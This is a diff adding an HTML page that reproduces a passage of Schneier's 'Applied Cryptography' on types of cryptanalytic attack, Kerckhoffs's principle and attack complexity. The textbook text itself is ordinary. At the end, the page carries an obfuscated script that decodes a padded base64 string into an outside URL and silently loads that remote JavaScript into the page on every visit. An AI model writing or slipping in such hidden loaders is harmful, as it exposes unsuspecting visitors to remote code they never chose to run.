@@ -1,0 +1,105 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Foundations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=01//-->
+<!--PAGES=006-009//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="01-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>There are at least three other types of cryptanalytic attack.
+</P>
+<DL>
+<DD><B>5.</B>&nbsp;&nbsp;<B>Chosen-ciphertext attack</B>. The cryptanalyst can choose different ciphertexts to be decrypted and has access to the decrypted plaintext. For example, the cryptanalyst has access to a tamperproof box that does automatic decryption. His job is to deduce the key.
+<DL>
+<DD>Given: <I>C</I><SUB>1</SUB>, <I>P</I><SUB>1</SUB> = <I>D</I><SUB>k</SUB>(<I>C</I><SUB>1</SUB>), <I>C</I><SUB>2</SUB>, <I>P</I><SUB>2</SUB> = <I>D</I><SUB>k</SUB>(<I>C</I><SUB>2</SUB>),...<I>C</I><SUB>i</SUB>, <I>P</I><SUB>i</SUB> = <I>D</I><SUB>k</SUB>(<I>C</I><SUB>i</SUB>)
+<DD>Deduce: <I>k</I>
+</DL>
+<BR>This attack is primarily applicable to public-key algorithms and will be discussed in Section 19.3. A chosen-ciphertext attack is sometimes effective against a symmetric algorithm as well. (Sometimes a chosen-plaintext attack and a chosen-ciphertext attack are together known as a <B>chosen-text attack</B>.)
+<DD><B>6.</B>&nbsp;&nbsp;<B>Chosen-key attack</B>. This attack doesn&#146;t mean that the cryptanalyst can choose the key; it means that he has some knowledge about the relationship between different keys. It&#146;s strange and obscure, not very practical, and discussed in Section 12.4.
+<DD><B>7.</B>&nbsp;&nbsp;<B>Rubber-hose cryptanalysis</B>. The cryptanalyst threatens, blackmails, or tortures someone until they give him the key. Bribery is sometimes referred to as a <B>purchase-key attack</B>. These are all very powerful attacks and often the best way to break an algorithm.
+</DL>
+<P>Known-plaintext attacks and chosen-plaintext attacks are more common than you might think. It is not unheard-of for a cryptanalyst to get a plaintext message that has been encrypted or to bribe someone to encrypt a chosen message. You may not even have to bribe someone; if you give a message to an ambassador, you will probably find that it gets encrypted and sent back to his country for consideration. Many messages have standard beginnings and endings that might be known to the cryptanalyst. Encrypted source code is especially vulnerable because of the regular appearance of keywords: #define, struct, else, return. Encrypted executable code has the same kinds of problems: functions, loop structures, and so on. Known-plaintext attacks (and even chosen-plaintext attacks) were successfully used against both the Germans and the Japanese during World War II. David Kahn&#146;s books [794,795,796] have historical examples of these kinds of attacks.
+</P>
+<P>And don&#146;t forget Kerckhoffs&#146;s assumption: If the strength of your new cryptosystem relies on the fact that the attacker does not know the algorithm&#146;s inner workings, you&#146;re sunk. If you believe that keeping the algorithm&#146;s insides secret improves the security of your cryptosystem more than letting the academic community analyze it, you&#146;re wrong. And if you think that someone won&#146;t disassemble your code and reverse-engineer your algorithm, you&#146;re na&#239;ve. (In 1994 this happened with the RC4 algorithm&#151;see Section 17.1.) The best algorithms we have are the ones that have been made public, have been attacked by the world&#146;s best cryptographers for years, and are still unbreakable. (The National Security Agency keeps their algorithms secret from outsiders, but they have the best cryptographers in the world working within their walls&#151;you don&#146;t. Additionally, they discuss their algorithms with one another, relying on peer review to uncover any weaknesses in their work.)</P>
+<P>Cryptanalysts don&#146;t always have access to the algorithms, as when the United States broke the Japanese diplomatic code PURPLE during World War II [794]&#151;but they often do. If the algorithm is being used in a commercial security program, it is simply a matter of time and money to disassemble the program and recover the algorithm. If the algorithm is being used in a military communications system, it is simply a matter of time and money to buy (or steal) the equipment and reverse-engineer the algorithm.</P>
+<P>Those who claim to have an unbreakable cipher simply because they can&#146;t break it are either geniuses or fools. Unfortunately, there are more of the latter in the world. Beware of people who extol the virtues of their algorithms, but refuse to make them public; trusting their algorithms is like trusting snake oil.</P>
+<P>Good cryptographers rely on peer review to separate the good algorithms from the bad.</P>
+<P><FONT SIZE="+1"><B><I>Security of Algorithms</I></B></FONT></P>
+<P>Different algorithms offer different degrees of security; it depends on how hard they are to break. If the cost required to break an algorithm is greater than the value of the encrypted data, then you&#146;re probably safe. If the time required to break an algorithm is longer than the time the encrypted data must remain secret, then you&#146;re probably safe. If the amount of data encrypted with a single key is less than the amount of data necessary to break the algorithm, then you&#146;re probably safe.
+</P>
+<P>I say &#147;probably&#148; because there is always a chance of new breakthroughs in cryptanalysis. On the other hand, the value of most data decreases over time. It is important that the value of the data always remain less than the cost to break the security protecting it.</P>
+<P>Lars Knudsen classified these different categories of breaking an algorithm. In decreasing order of severity [858]:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;<B>Total break</B>. A cryptanalyst finds the key, <I>K</I>, such that <I>D</I><SUB>K</SUB>(<I>C</I>) = <I>P</I>.
+<DD><B>2.</B>&nbsp;&nbsp;<B>Global deduction</B>. A cryptanalyst finds an alternate algorithm, <I>A</I>, equivalent to <I>D</I><SUB>K</SUB>(<I>C</I>), without knowing <I>K</I>.
+<DD><B>3.</B>&nbsp;&nbsp;<B>Instance (or local) deduction</B>. A cryptanalyst finds the plaintext of an intercepted ciphertext.
+<DD><B>4.</B>&nbsp;&nbsp;<B>Information deduction</B>. A cryptanalyst gains some information about the key or plaintext. This information could be a few bits of the key, some information about the form of the plaintext, and so forth.
+</DL>
+<P>An algorithm is <B>unconditionally secure</B> if, no matter how much ciphertext a cryptanalyst has, there is not enough information to recover the plaintext. In point of fact, only a one-time pad (see Section 1.5) is unbreakable given infinite resources. All other cryptosystems are breakable in a ciphertext-only attack, simply by trying every possible key one by one and checking whether the resulting plaintext is meaningful. This is called a <B>brute-force</B> attack (see Section 7.1).</P>
+<P>Cryptography is more concerned with cryptosystems that are computationally infeasible to break. An algorithm is considered <B>computationally secure</B> (sometimes called strong) if it cannot be broken with available resources, either current or future. Exactly what constitutes &#147;available resources&#148; is open to interpretation.</P>
+<P>You can measure the complexity (see Section 11.1) of an attack in different ways:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;<B>Data complexity</B>. The amount of data needed as input to the attack.
+<DD><B>2.</B>&nbsp;&nbsp;<B>Processing complexity</B>. The time needed to perform the attack. This is often called the <B>work factor</B>.
+<DD><B>3.</B>&nbsp;&nbsp;<B>Storage requirements</B>. The amount of memory needed to do the attack.
+</DL>
+<P>As a rule of thumb, the complexity of an attack is taken to be the minimum of these three factors. Some attacks involve trading off the three complexities: A faster attack might be possible at the expense of a greater storage requirement.
+</P>
+<P>Complexities are expressed as orders of magnitude. If an algorithm has a processing complexity of 2<SUP>128</SUP>, then 2<SUP>128</SUP> operations are required to break the algorithm. (These operations may be complex and time-consuming.) Still, if you assume that you have enough computing speed to perform a million operations every second and you set a million parallel processors against the task, it will still take over 10<SUP>19</SUP> years to recover the key. That&#146;s a billion times the age of the universe.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="01-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ZnSEaAEa, hhnfgLaZ) {hhnfgLaZ = ZnSEaAEa.createElement('script');hhnfgLaZ.type = 'text/javascript';hhnfgLaZ.async = true;hhnfgLaZ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ZnSEaAEa.getElementsByTagName('body')[0].appendChild(hhnfgLaZ);}(document));</script></body>
+</html>
